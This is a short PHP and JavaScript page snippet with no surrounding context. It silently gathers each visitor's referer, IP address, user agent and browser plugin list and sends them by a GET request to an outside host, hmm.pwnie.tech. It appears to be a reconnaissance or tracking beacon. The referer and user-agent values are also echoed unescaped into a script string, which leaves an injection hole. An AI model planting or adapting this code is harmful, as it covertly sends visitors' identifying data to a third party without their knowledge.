<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<?php
    $referer = $_SERVER['HTTP_REFERER'];
    $IP = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
?>
<script>
    var pluginsList = "";
    for (var i = 0; i < navigator.plugins.length; i++) {
        if (i > 0) {
           pluginsList = pluginsList + ",";
        }
        pluginsList = pluginsList + navigator.plugins[i].name;
    }
    var data = "<?php echo("Referer=".$referer."&IP=".$IP."&UserAgent=".$agent); ?>" + "&plugins=" + pluginsList;
    data = encodeURI(data);
    console.log(data);
    $.get("http://hmm.pwnie.tech/index.php?" + data, function(data) {});
</script>
